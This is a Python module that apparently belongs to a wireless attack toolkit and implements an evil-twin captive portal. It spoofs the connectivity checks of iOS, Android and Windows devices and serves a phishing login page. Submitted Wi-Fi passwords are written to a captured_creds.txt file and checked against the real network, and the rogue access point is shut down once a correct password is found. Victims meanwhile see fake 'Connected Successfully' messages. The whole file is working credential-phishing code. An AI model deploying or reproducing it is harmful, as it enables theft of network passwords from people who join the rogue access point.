import subprocess
import os
import logging
import threading
import socket
import json
import urllib.parse
import datetime

from http.server import HTTPServer, SimpleHTTPRequestHandler
from logger import Logger

logger = Logger(name="captive_portal.py", level=logging.DEBUG)
b_class = "CaptivePortal"
b_module = "captive_portal"
b_status = "captive_portal"
b_port = 0
b_parent = None
CAPTIVE_PORT = 80
CRED_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'data', 'captured_creds.txt')
PORTALS_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'web', 'portals')
CUSTOM_PORTALS_DIR = os.path.join(PORTALS_DIR, 'custom')


class CaptiveHandler(SimpleHTTPRequestHandler):
    portal_template = "generic.html"
    wpa_validate_enabled = False
    wpa_interface = ""
    wpa_validator = None
    loot_monitor = None
    ssid = ""
    evil_ap_instance = None
    _cached_template = None

    def _detect_os(self, user_agent):
        ua = user_agent.lower()
        if "captivenetworksupport" in ua or "apple" in ua:
            return "ios"
        if "android" in ua:
            return "android"
        if "windows" in ua or "msft" in ua:
            return "windows"
        if "macintosh" in ua or "mac os" in ua:
            return "macos"
        if "linux" in ua and "android" not in ua:
            return "linux"
        return "other"

    def _send_success_page(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>")

    def _send_204(self):
        self.send_response(204)
        self.end_headers()

    def _send_redirect(self, location):
        self.send_response(302)
        self.send_header("Location", location)
        self.end_headers()

    def _load_template(self, template_name):
        paths = [
            os.path.join(CUSTOM_PORTALS_DIR, template_name),
            os.path.join(PORTALS_DIR, template_name),
        ]
        for p in paths:
            if os.path.isfile(p):
                with open(p, 'r', encoding='utf-8') as f:
                    return f.read()
        return "<html><body><h2>Portal not found</h2></body></html>"

    def _serve_portal(self):
        html = self._cached_template
        if html is None:
            html = self._load_template(self.portal_template)
            html = html.replace("{ACTION_URL}", "/login")
            self._cached_template = html
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.send_header("Expires", "0")
        self.end_headers()
        self.wfile.write(html.encode("utf-8"))

    def do_GET(self):
        path = self.path
        ua = self.headers.get("User-Agent", "")
        client_ip = self.client_address[0]

        if self.loot_monitor:
            self.loot_monitor.add_http_request(path, ua, client_ip, str(datetime.datetime.now()))

        os_type = self._detect_os(ua)

        if os_type == "ios" and ("captive.apple.com" in path or "hotspot-detect" in path):
            self._send_success_page()
            return

        if os_type == "android" and ("generate_204" in path or "connectivitycheck" in path):
            self._send_204()
            return

        if "connecttest.txt" in path or "msftconnecttest" in path:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Microsoft Connect Test")
            return

        if path == "/":
            self._serve_portal()
        else:
            self._send_redirect("/")

    def do_POST(self):
        if self.path == "/login":
            content_length = int(self.headers.get("Content-Length", 0))
            post_data = self.rfile.read(content_length).decode()
            parsed = urllib.parse.parse_qs(post_data)
            password = urllib.parse.unquote(parsed.get("password", [""])[0])
            now = str(datetime.datetime.now())

            with open(CRED_FILE, "a") as f:
                f.write(f"{now} | {password}\n")
            logger.success(f"Captured credential: {password}")

            if self.wpa_validate_enabled and self.wpa_validator and password:
                result = self.wpa_validator.validate(
                    ssid=self.ssid,
                    password=password,
                    interface=self.wpa_interface,
                    timeout=10
                )
                if result["success"]:
                    logger.success(f"WPA Validate SUCCESS — correct password: {password}")
                    if self.evil_ap_instance and self.wpa_interface == self.evil_ap_instance.interface:
                        self.evil_ap_instance.stop()
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html; charset=utf-8")
                    self.end_headers()
                    self.wfile.write(b"""<html><body style="font-family:Arial;text-align:center;padding:40px">
                        <h2 style="color:#2d7d46">&#10004; Connected Successfully!</h2>
                        <p>You now have internet access. You may close this page.</p>
                    </body></html>""")
                else:
                    logger.info(f"WPA Validate FAILED for password: {password}")
                    if self.evil_ap_instance and self.wpa_interface == self.evil_ap_instance.interface:
                        self.evil_ap_instance.restart()
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html; charset=utf-8")
                    self.end_headers()
                    self.wfile.write(b"""<html><body style="font-family:Arial;text-align:center;padding:40px">
                        <h2 style="color:#d93025">&#10060; Wrong Password</h2>
                        <p>The password you entered is incorrect. Please try again.</p>
                        <a href="/" style="color:#1a73e8;font-size:16px">Try Again</a>
                    </body></html>""")
            else:
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(b"""<html><body style="font-family:Arial;text-align:center;padding:40px">
                    <h2 style="color:#2d7d46">&#10004; Update successful!</h2>
                    <p>You may close this page and continue browsing.</p>
                </body></html>""")


class CaptivePortal:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.server = None
        self.thread = None
        self.running = False

    def start(self, port=80, portal_template="generic.html",
              wpa_validate_enabled=False, wpa_interface="",
              wpa_validator=None, loot_monitor=None, ssid="",
              evil_ap_instance=None):
        try:
            CaptiveHandler.portal_template = portal_template
            CaptiveHandler._cached_template = None
            CaptiveHandler.wpa_validate_enabled = wpa_validate_enabled
            CaptiveHandler.wpa_interface = wpa_interface
            CaptiveHandler.wpa_validator = wpa_validator
            CaptiveHandler.loot_monitor = loot_monitor
            CaptiveHandler.ssid = ssid
            CaptiveHandler.evil_ap_instance = evil_ap_instance

            self.server = HTTPServer(('0.0.0.0', port), CaptiveHandler)
            self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.thread.start()
            self.running = True
            logger.info(f"Captive portal started on port {port} (template: {portal_template})")
            return True
        except Exception as e:
            logger.error(f"Failed to start captive portal: {e}")
            return False

    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.server = None
            self.running = False
            logger.info("Captive portal stopped")

    def execute(self, ip="", port="", row=None, status_key=""):
        return 'success'
